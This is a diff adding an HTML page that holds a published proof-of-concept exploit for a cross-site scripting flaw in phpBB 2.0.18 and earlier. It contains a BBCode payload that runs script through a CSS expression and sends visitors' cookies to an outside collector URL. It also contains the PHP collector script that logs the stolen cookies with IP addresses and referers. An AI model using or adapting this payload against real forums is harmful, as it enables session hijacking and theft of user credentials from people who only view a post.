@@ -1,0 +1,33 @@
+<html><head><title>phpBB <= 2.0.18 Remote XSS Cookie Disclosure Exploit</title></head><pre>/******************************************************************
+
+phpBB &lt;= 2.0.18 XSS Cookie Disclosure Proof of Concept
+	-- 'the html is on exploit'
+
+original exploit by:  (cXIb8O3) - 12/16/2005
+proof of concept by: jet
+	-- http://jet.carbon-4.net/
+	
+		develop a pure, lucid mind, not 
+		depending upon sound, flavor,
+		touch, odor, or any quality.
+				- the diamond sutra
+
+******************************************************************/
+
+phpbb code:
+
+&lt;B C=&quot;&gt;&quot; ''style='font-size:0;color:#EFEFEF'style='top:expression(eval(this.sss));'sss=`i=new/**/Image();i.src='http://www.url.com/cookie/c.php?c='+document.cookie;this.sss=null`style='font-size:0; X=&quot;&lt;B &quot;&gt;'&lt;/B&gt;
+
+c.php:
+
+&lt;?php
+ $cookie = $_GET['c'];
+ $ip = getenv ('REMOTE_ADDR');
+ $date=date(&quot;m/d/Y g:i:s a&quot;);
+ $referer=getenv ('HTTP_REFERER');
+ $fl = fopen('log.txt', 'a');
+ fwrite($fl, &quot;\n&quot;.$ip.' :: '.$date.&quot;\n&quot;.$referer.&quot; :: &quot;.$cookie.&quot;\n&quot;);
+ fclose($fl);
+?&gt;
+
+# milw0rm.com [2005-12-21]</pre></html>
